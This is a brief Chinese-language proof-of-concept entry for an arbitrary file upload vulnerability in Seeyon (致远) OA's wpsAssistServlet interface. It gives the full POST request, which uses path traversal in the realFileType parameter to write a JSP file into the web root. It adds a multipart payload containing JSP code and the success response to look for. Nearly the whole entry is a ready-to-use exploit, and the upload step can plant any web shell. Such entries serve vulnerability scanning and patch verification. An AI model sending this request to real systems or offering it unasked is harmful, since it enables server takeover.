# 致远OAwpsAssistServlet接口任意文件上传漏洞

致远OA ｜ 文件上传 ｜ —
- **请求**：`POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/01014.jsp&fileId=2 HTTP/1.1`

**Payload**
```
--a4d7586ac9d50625dee11e86fa69bc71
Content-Disposition: form-data; name="upload"; filename="123.xls"
Content-Type: application/vnd.ms-excel
<% out.println("215882935");%>
--a4d7586ac9d50625dee11e86fa69bc71--
```
- **响应特征**：200 true